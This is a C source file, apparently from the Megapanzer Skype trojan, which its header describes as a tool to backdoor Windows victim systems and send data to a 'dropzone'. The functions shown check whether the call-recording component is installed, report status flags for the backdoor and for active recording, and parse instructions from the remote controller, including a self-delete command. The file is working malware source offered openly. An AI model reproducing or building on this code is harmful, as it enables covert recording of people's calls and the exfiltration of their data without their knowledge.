/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */






/*
 * Tool name   : 
 * Description : Tool to backdoor a MS Windows victim system and sending back
 *               data packages to the dropzone.
 * Version     : 0.2
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */




#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlwapi.h>
#include "SkypeTrojan.h"
#include "Status.h"
#include "GeneralFunctions.h"


extern int gLocalStatusInformationValues[];
extern char *gBDEnvironmentDirs[];
extern char *gBaseDirectory;
extern char *gRemoteStatusInformationNames[];
extern int gRemoteStatusInformationValues[];






/*
 * Check if VoIP-Tap is installed.
 *
 */

int VT_installed()
{
  int mRetVal = 0;
  int mCounter = 0;
  char mUploadDirFullPath[MAX_BUF_SIZE + 1];
  char mTemp[MAX_BUF_SIZE + 1];



  /*
   * Check all possible backdoor directories for uploadable files.
   *
   */

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      /*
       * Make sure the directory name ends with a backslash.
       *
       */

      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");
    
      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");



      /*
       * Check if the CALLID file exists.
       *
       */

      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, CALLID_FILENAME);
      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;   


      /*
       * Check if the UPLOAD directory exists.
       *
       */

      ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));
      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, BD_DATA_DIR);

      if (mUploadDirFullPath[strlen(mUploadDirFullPath) - 1] != '\\')
        strcat(mUploadDirFullPath, "\\");

      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;  


      if (mRetVal > 0)
        break;
    } // if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  }  // for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)

  return(mRetVal);
}    







/*
 * Do the local status checks.
 *
 */

int localStatusChecks()
{
  int mStatusMessages = 0; 
  int mCounter = 0;


  /*
   * Is VoIP-Tap installed?
   *
   */

  if (VT_installed() > 0)
    mStatusMessages += gLocalStatusInformationValues[VT_INSTALLED];


  /*
   * Is the backdoor installed (of course!)?
   */

  mStatusMessages += gLocalStatusInformationValues[BT_INSTALLED];



  /*
   * Is ST recording?
   */

 if (isUserSkyping() == 0)
   mStatusMessages += gLocalStatusInformationValues[VT_RECORDING];


 
  return(mStatusMessages);
}






/*
 * We received status information/instructions from the dropzone. 
 * Process the instructions.
 *
 */

void remoteStatusChecks(char *pStatusInformation)
{
  FILE *mFH = NULL;
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  char *mTempPointer = 0;
  char mTemp[MAX_BUF_SIZE + 1];

  int mRemoteStatus = 0;
  int mRemoteStatusEntries = 0;
  int mCounter = 0;
  int mRemoteStatusArray[MAX_BUF_SIZE];


  mTempPointer = pStatusInformation;
  mCounter = 0;

  while (mTempPointer[mCounter] != NULL)
  {
    if (mTempPointer[mCounter] == '\n' || mTempPointer[mCounter] == '\r')
      mTempPointer[mCounter] = ' ';
    mCounter++;
  }
        


  /*
   * Extract status data.
   *
   */

  ZeroMemory(mRemoteStatusArray, sizeof(mRemoteStatusArray));
  mRemoteStatus = 0;
  if (strstr(pStatusInformation, "status=") != NULL)
  {
    mTempPointer = strstr(pStatusInformation, "status") + strlen("status") + 1;

    if (strchr(mTempPointer, '&') != NULL)
    {
      ZeroMemory(mTemp, sizeof(mTemp));
      mCounter = 0;

      while (mTempPointer[mCounter] != '&' && mTempPointer[mCounter] != NULL)
        mCounter++;

      strncpy(mTemp, mTempPointer, mCounter);
      mRemoteStatus = atoi(mTemp);
    }
  }



  /*
   * Fill in the "remote status array" values.
   *
   */

  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mCounter = 0;
  mRemoteStatusEntries -= 1;


  while (mRemoteStatusEntries >= 0)
  {
    if (mRemoteStatus >= gRemoteStatusInformationValues[mRemoteStatusEntries])
    {
      mRemoteStatusArray[mRemoteStatusEntries] = 1;
      mRemoteStatus -= gRemoteStatusInformationValues[mRemoteStatusEntries];
    } else
      mRemoteStatusArray[mRemoteStatusEntries] = 0;

    mRemoteStatusEntries--;
  } 


  mRemoteStatusEntries = 0;
  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mRemoteStatusEntries -= 1;



  /*
   * We received a delete instruction. Launch Skype trojan deletion.
   *
   */

  if (mRemoteStatusArray[VR_DELETE_IT] == 1)
  {
    deleteEverything();
    exit(0);
  }
}